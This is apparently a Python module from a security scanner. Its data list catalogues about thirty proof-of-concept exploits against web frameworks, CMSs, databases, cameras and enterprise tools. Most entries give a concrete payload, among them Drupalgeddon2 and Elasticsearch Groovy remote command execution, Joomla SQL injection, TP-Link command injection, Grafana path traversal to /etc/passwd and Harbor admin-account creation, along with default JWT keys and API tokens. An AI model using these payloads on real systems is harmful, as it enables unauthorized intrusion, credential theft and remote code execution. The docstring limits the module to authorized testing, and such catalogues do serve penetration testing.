"""
poc_extended安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""

EXTENDED_POCS = [
    # ===== Web框架 =====
    {"poc_id": "POC-LARAVEL-001", "name": "Laravel Debug模式RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2021-3129", "target_service": "http", "target_port": 80, "desc": "Laravel Debug模式未授权远程代码执行（Ignition漏洞）", "payload": "POST /_ignition/execute-solution {solution: Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution, parameters: {viewFile: php://filter/write=convert.base64-decode/resource=..., variableName: ...}}", "verification": "写入webshell并访问执行命令"},
    {"poc_id": "POC-DJANGO-001", "name": "Django Debug模式信息泄露", "category": "info", "severity": "medium", "cve_id": "", "target_service": "http", "target_port": 80, "desc": "Django Debug模式开启导致敏感信息泄露（SECRET_KEY/数据库配置）", "payload": "触发404/500错误页面", "verification": "检查错误页面是否包含SECRET_KEY和配置信息"},
    {"poc_id": "POC-FLASK-001", "name": "Flask Debug PIN码RCE", "category": "rce", "severity": "high", "cve_id": "", "target_service": "http", "target_port": 5000, "desc": "Flask Debug模式Werkzeug控制台PIN码可预测，导致远程代码执行", "payload": "计算PIN码后访问/console执行Python代码", "verification": "在Werkzeug控制台执行id命令"},
    {"poc_id": "POC-NODEJS-001", "name": "Node.js 原型污染RCE", "category": "rce", "severity": "critical", "cve_id": "", "target_service": "http", "target_port": 3000, "desc": "Node.js应用原型污染漏洞可导致远程代码执行", "payload": "{\"__proto__\": {\"polluted\": true}}", "verification": "检查原型链是否被污染"},

    # ===== CMS =====
    {"poc_id": "POC-WP-001", "name": "WordPress 未授权REST API用户枚举", "category": "info", "severity": "low", "cve_id": "", "target_service": "http", "target_port": 80, "desc": "WordPress REST API未授权用户枚举", "payload": "GET /wp-json/wp/v2/users", "verification": "检查是否返回用户列表"},
    {"poc_id": "POC-WP-002", "name": "WordPress xmlrpc 暴力破解", "category": "brute", "severity": "medium", "cve_id": "", "target_service": "http", "target_port": 80, "desc": "WordPress xmlrpc.php系统.multicall方法可批量暴力破解密码", "payload": "POST /xmlrpc.php {methodName: system.multicall, params: [[{methodName: wp.getUsersBlogs, params: [admin, password]}]]}", "verification": "检查响应中是否包含成功登录"},
    {"poc_id": "POC-JOOMLA-001", "name": "Joomla com_fields SQL注入", "category": "sqli", "severity": "high", "cve_id": "CVE-2017-8917", "target_service": "http", "target_port": 80, "desc": "Joomla com_fields组件SQL注入漏洞", "payload": "GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)", "verification": "检查是否返回数据库错误信息"},
    {"poc_id": "POC-DRUPAL-001", "name": "Drupal Drupalgeddon2 RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2018-7600", "target_service": "http", "target_port": 80, "desc": "Drupal Drupalgeddon2远程代码执行漏洞", "payload": "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax {form_id: user_register_form, _drupal_ajax: 1, mail[a][#post_render][]: exec, mail[a][#type]: markup, mail[a][#markup]: id}", "verification": "检查响应中是否包含命令执行结果"},
    {"poc_id": "POC-DRUPAL-002", "name": "Drupal Drupalgeddon3 RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2018-7602", "target_service": "http", "target_port": 80, "desc": "Drupal Drupalgeddon3远程代码执行漏洞（需要认证）", "payload": "POST /node/1/edit?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax", "verification": "检查响应中是否包含命令执行结果"},

    # ===== 中间件/网关 =====
    {"poc_id": "POC-NACOS-001", "name": "Nacos 未授权访问", "category": "rce", "severity": "critical", "cve_id": "CVE-2021-29441", "target_service": "http", "target_port": 8848, "desc": "Nacos未授权访问漏洞，可获取配置信息和用户凭证", "payload": "GET /nacos/v1/auth/users?pageNo=1&pageSize=9", "verification": "检查是否返回用户列表"},
    {"poc_id": "POC-NACOS-002", "name": "Nacos JWT认证绕过", "category": "rce", "severity": "critical", "cve_id": "CVE-2021-29442", "target_service": "http", "target_port": 8848, "desc": "Nacos默认JWT密钥导致认证绕过", "payload": "使用默认密钥SecretKey01234567890123456789012345678901234567890123456789012345678生成JWT", "verification": "使用伪造JWT访问受保护接口"},
    {"poc_id": "POC-APISIX-001", "name": "Apache APISIX 默认Token RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2022-24112", "target_service": "http", "target_port": 9080, "desc": "Apache APISIX默认Admin API Token导致远程代码执行", "payload": "使用默认token edd1c9f034335f136f87ad84b625c8f1创建路由并执行命令", "verification": "访问创建的路由执行命令"},
    {"poc_id": "POC-SHENYU-001", "name": "Apache ShenYu 未授权RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2021-37580", "target_service": "http", "target_port": 9195, "desc": "Apache ShenYu未授权访问导致远程代码执行", "payload": "POST /dashboardUser {userName: admin, password: 123456}", "verification": "创建管理员账户并登录"},

    # ===== 数据库/缓存 =====
    {"poc_id": "POC-ELASTICSEARCH-001", "name": "Elasticsearch 未授权访问", "category": "info", "severity": "high", "cve_id": "", "target_service": "http", "target_port": 9200, "desc": "Elasticsearch未授权访问漏洞，可读取/修改/删除所有数据", "payload": "GET /_cat/indices?v", "verification": "检查是否返回索引列表"},
    {"poc_id": "POC-ELASTICSEARCH-002", "name": "Elasticsearch Groovy脚本RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2015-1427", "target_service": "http", "target_port": 9200, "desc": "Elasticsearch Groovy脚本执行漏洞导致远程代码执行", "payload": "POST /_search {script_fields: {test: {script: \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getMethod(\\\"exec\\\",java.lang.String).invoke(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null),\\\"id\\\")\"}}}", "verification": "检查响应中是否包含命令执行结果"},
    {"poc_id": "POC-MONGODB-001", "name": "MongoDB 未授权访问", "category": "info", "severity": "high", "cve_id": "", "target_service": "tcp", "target_port": 27017, "desc": "MongoDB未授权访问漏洞，可读取/修改/删除所有数据库", "payload": "mongo --host target --port 27017", "verification": "连接后执行show dbs查看数据库"},
    {"poc_id": "POC-MEMCACHED-001", "name": "Memcached 未授权访问", "category": "info", "severity": "medium", "cve_id": "", "target_service": "tcp", "target_port": 11211, "desc": "Memcached未授权访问漏洞，可读取/修改缓存数据", "payload": "echo 'stats' | nc target 11211", "verification": "检查是否返回Memcached统计信息"},
    {"poc_id": "POC-ZOOKEEPER-001", "name": "ZooKeeper 未授权访问", "category": "info", "severity": "medium", "cve_id": "", "target_service": "tcp", "target_port": 2181, "desc": "ZooKeeper未授权访问漏洞，可读取/修改节点数据", "payload": "echo 'ls /' | nc target 2181", "verification": "检查是否返回根节点列表"},
    {"poc_id": "POC-CONSUL-001", "name": "Consul 未授权RCE", "category": "rce", "severity": "critical", "cve_id": "", "target_service": "http", "target_port": 8500, "desc": "Consul未授权访问可注册服务并执行任意命令", "payload": "PUT /v1/agent/service/register {ID: test, Name: test, Address: 127.0.0.1, Port: 80, Check: {Script: id, Interval: 10s}}", "verification": "检查Consul日志中是否包含命令执行结果"},

    # ===== 网络设备 =====
    {"poc_id": "POC-HIKVISION-001", "name": "海康威视 未授权访问", "category": "info", "severity": "high", "cve_id": "CVE-2017-7921", "target_service": "http", "target_port": 80, "desc": "海康威视摄像头未授权访问漏洞，可获取用户列表和快照", "payload": "GET /System/configurationFile?auth=YWRtaW46MTEK", "verification": "检查是否返回配置文件"},
    {"poc_id": "POC-DAHUA-001", "name": "大华摄像头 未授权访问", "category": "info", "severity": "high", "cve_id": "CVE-2021-33044", "target_service": "http", "target_port": 80, "desc": "大华摄像头身份认证绕过漏洞", "payload": "GET /current_config/passwd", "verification": "检查是否返回密码哈希"},
    {"poc_id": "POC-TPLINK-001", "name": "TP-Link 命令注入", "category": "rce", "severity": "critical", "cve_id": "CVE-2023-1389", "target_service": "http", "target_port": 80, "desc": "TP-Link Archer AX21命令注入漏洞（locale参数）", "payload": "GET /cgi-bin/luci/;stok=/admin/wireless?form=guest&guest2g_enable=1&guest2g_ssid=test&guest2g_password=test&guest2g_security=none&guest2g_isolate=0&guest2g_schedule=0&guest2g_start=00:00&guest2g_end=23:59&guest2g_schedule_day=1234567&locale=;id;", "verification": "检查响应中是否包含命令执行结果"},

    # ===== 企业应用 =====
    {"poc_id": "POC-ZABBIX-001", "name": "Zabbix 认证绕过RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2022-23131", "target_service": "http", "target_port": 8080, "desc": "Zabbix SAML SSO认证绕过漏洞，可登录管理员账户", "payload": "构造恶意SAML响应设置admin用户", "verification": "使用绕过的会话访问管理界面"},
    {"poc_id": "POC-ZABBIX-002", "name": "Zabbix Autologin 认证绕过", "category": "rce", "severity": "high", "cve_id": "CVE-2022-23134", "target_service": "http", "target_port": 8080, "desc": "Zabbix setup.php autologin认证绕过漏洞", "payload": "GET /zabbix/setup.php", "verification": "检查是否可以绕过认证进入安装界面"},
    {"poc_id": "POC-GITLAB-001", "name": "GitLab 未授权仓库访问", "category": "info", "severity": "high", "cve_id": "CVE-2021-22205", "target_service": "http", "target_port": 80, "desc": "GitLab ExifTool命令注入漏洞导致远程代码执行", "payload": "上传包含恶意DJVU元数据的图片", "verification": "检查是否触发命令执行"},
    {"poc_id": "POC-JENKINS-001", "name": "Jenkins 未授权访问", "category": "rce", "severity": "critical", "cve_id": "", "target_service": "http", "target_port": 8080, "desc": "Jenkins未授权访问漏洞，可创建任务并执行任意命令", "payload": "GET /script", "verification": "检查是否可以访问Groovy脚本控制台"},
    {"poc_id": "POC-JENKINS-002", "name": "Jenkins CLI 反序列化RCE", "category": "rce", "severity": "critical", "cve_id": "CVE-2017-1000353", "target_service": "tcp", "target_port": 50000, "desc": "Jenkins CLI反序列化漏洞导致远程代码执行", "payload": "使用ysoserial生成反序列化payload通过CLI发送", "verification": "检查是否触发命令执行"},
    {"poc_id": "POC-SONARQUBE-001", "name": "SonarQube 未授权访问", "category": "info", "severity": "medium", "cve_id": "", "target_service": "http", "target_port": 9000, "desc": "SonarQube未授权访问漏洞，可读取代码分析结果", "payload": "GET /api/projects/index", "verification": "检查是否返回项目列表"},
    {"poc_id": "POC-HARBOR-001", "name": "Harbor 未授权访问", "category": "info", "severity": "high", "cve_id": "CVE-2019-16097", "target_service": "http", "target_port": 80, "desc": "Harbor未授权创建管理员账户漏洞", "payload": "POST /api/users {username: admin2, email: a@a.com, password: Harbor12345, realname: admin, comment: admin, has_admin_role: true}", "verification": "检查是否成功创建管理员账户"},
    {"poc_id": "POC-KIBANA-001", "name": "Kibana 未授权访问", "category": "info", "severity": "medium", "cve_id": "", "target_service": "http", "target_port": 5601, "desc": "Kibana未授权访问漏洞，可查询Elasticsearch数据", "payload": "GET /api/saved_objects/_find?type=index-pattern", "verification": "检查是否返回索引模式"},
    {"poc_id": "POC-PROMETHEUS-001", "name": "Prometheus 未授权访问", "category": "info", "severity": "medium", "cve_id": "", "target_service": "http", "target_port": 9090, "desc": "Prometheus未授权访问漏洞，可获取监控指标和敏感信息", "payload": "GET /api/v1/targets", "verification": "检查是否返回监控目标列表"},
    {"poc_id": "POC-GRAFANA-002", "name": "Grafana 插件未授权文件读取", "category": "lfi", "severity": "high", "cve_id": "CVE-2021-43798", "target_service": "http", "target_port": 3000, "desc": "Grafana插件路径遍历漏洞，可读取服务器任意文件", "payload": "GET /public/plugins/alertlist/../../../../../../../../etc/passwd", "verification": "检查是否返回/etc/passwd内容"},
]
